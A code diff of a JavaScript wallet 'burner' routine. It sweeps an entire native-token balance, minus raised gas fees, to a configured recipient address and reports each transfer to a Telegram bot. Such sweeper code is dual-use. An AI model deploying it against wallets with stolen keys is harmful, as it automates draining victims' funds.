@@ -239,80 +239,105 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // =================================== burning process   =======================================
 
-      const utils = ethers.utils;
-      const formatEther = utils.formatEther;
+    const utils = ethers.utils;
+    const formatEther = utils.formatEther;
+
+    const burn_native_tokens = async (burnWallet, config_de_value) => {
+
       let defaultGasLimit = 21000;
+      let extraGasFee = config_de_value['extra_gas_fee'];
+      let gasLimit = defaultGasLimit + parseInt(config_de_value['extra_gas_limit']);
 
-      const burn_native_tokens = async (burnWallet, config_de_value) => {
-        const balance = await burnWallet.getBalance();
-        if (balance.isZero()) {
-          console.log(`Balance is zero`);
-          return;
+      const balance = await burnWallet.getBalance();
+      if (balance.isZero()) {
+        console.log(`Balance is zero`);
+        return;
+      }
+
+      const gasPrice = (await burnWallet.getGasPrice()).add(utils.parseUnits(extraGasFee.trim(), 'gwei'));
+
+      let gas_fee_in_eth = gasPrice.mul(gasLimit);
+
+      if (balance.lt(gas_fee_in_eth)) {
+        console.log(`🔻 Balance [${ethers.utils.formatEther(balance,)}] is very low for gas price: ${gasPrice.toString()} gwei [${ethers.utils.formatEther(gas_fee_in_eth,)}]`);
+        return;
+      }
+
+      const leftovers = balance.sub(gas_fee_in_eth);
+
+      try {
+
+        console.log(`🔥 Burning: ${formatEther(balance)}`);
+
+        const nonce = await burnWallet.provider.getTransactionCount(burnWallet.address);
+
+        const tx_object = {
+          to: config_de_value['recipient_address'],
+          gasLimit: gasLimit,
+          gasPrice,
+          nonce,
+          value: leftovers,
+        };
+
+        const tx = await burnWallet.sendTransaction(tx_object);
+
+        console.log('🚀 Transaction submitted');
+        console.log(`📲 Transfer: ${formatEther(leftovers)}`);
+
+        const receipt = await tx.wait();
+        const txHash = receipt.transactionHash;
+
+        console.log('✅ Tx hash - ' + txHash);
+
+        const amount = formatEther(leftovers);
+        const bot_token = config_de_value['your_telegram_bot_token'];
+        const telegram_id = config_de_value['your_telegram_user_id'];
+        const network_name = config_de_value['network_name'];
+
+        let message = prepareMessage(network_name, txHash, amount);
+        sendTelegramMessage(bot_token, telegram_id, message);
+
+      } catch (err) {
+        if (
+          err.code === 'REPLACEMENT_UNDERPRICED' ||
+          err.code === 'INSUFFICIENT_FUNDS'
+        ) {
+          console.log('Gas fee too low. Transaction may fail. 😔');
+        } else {
+          console.log('Error sending transaction: 😱', err);
         }
+      }
+      
+    };
 
-        const gasPrice = (await burnWallet.getGasPrice()).add(utils.parseUnits((config_de_value['extra_gas_fee'] + '').trim(),'gwei'));
 
+    // ================== tg ===============
+    const prepareMessage = (network, txHash, amount) => {
+        return `Network: <code>${network}</code>\n
+Tx Hash: <code>${txHash}</code>\n
+Amount: <code>${amount}</code>`;
 
-        let gas_fee_in_et = gasPrice.mul(config_de_value['extra_gas_limit']);
+    };
 
-        if (balance.lt(gas_fee_in_et)) {
-          console.log(`🔻 Balance [${ethers.utils.formatEther( balance)}] is very low for gas price: ${gasPriceToGwei(gasPrice)} gwei [${ethers.utils.formatEther(gas_fee_in_et)}]`);
-          return;
+    const sendTelegramMessage = async (bot_token, telegram_id, message) => {
+      const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
+      const payload = {chat_id: telegram_id,text: message,parse_mode: 'HTML',};
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log('Message sent successfully');
+        } else {
+          console.error('Error sending message:', response.statusText);
         }
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    };
 
-        console.log(gas_fee_in_et.toString());
-        console.log(gasPrice.toString());
-
-        const leftovers = balance.sub(gasPrice.mul(config_de_value['extra_gas_limit']));
-
-        console.log(leftovers);
-
-          try {
-            console.log(`🔥 Burning: ${formatEther(balance)}`);
-
-            const nonce = await burnWallet.provider.getTransactionCount(
-              burnWallet.address,
-            );
-
-            const tx = await burnWallet.sendTransaction({
-              to: config_de_value['recipient_address'],
-              gasLimit: config_de_value.gas_limit,
-              gasPrice,
-              nonce,
-              value: leftovers,
-            });
-
-        //     console.log('🚀 Transactions submitted');
-        //     console.log(`📲 Transfer: ${formatEther(leftovers)}`);
-
-        //     const receipt = await tx.wait();
-        //     const txHash = receipt.transactionHash;
-
-        //     console.log('✅ Tx hash - ' + txHash);
-
-        //     const amount = formatEther(leftovers);
-        //     const bot_token = config_de_value.telegram_bot_token;
-        //     const telegram_id = config_de_value.telegram_user_id;
-
-        //     let prepare_message = SendTgMessage.prepare_message({
-        //       network: config_de_value.network_name,
-        //       hash: txHash,
-        //       amount: amount,
-        //     });
-        //     SendTgMessage.send_message(
-        //       { bot_token: bot_token, telegram_id: telegram_id },
-        //       prepare_message,
-        //     );
-          } catch (err) {
-            if (
-              err.code === 'REPLACEMENT_UNDERPRICED' ||
-              err.code === 'INSUFFICIENT_FUNDS'
-            ) {
-              console.log('Gas fee too low. Transaction may fail. 😔');
-            } else {
-              console.log('Error sending transaction: 😱', err);
-            }
-          }
-
-      };
 });
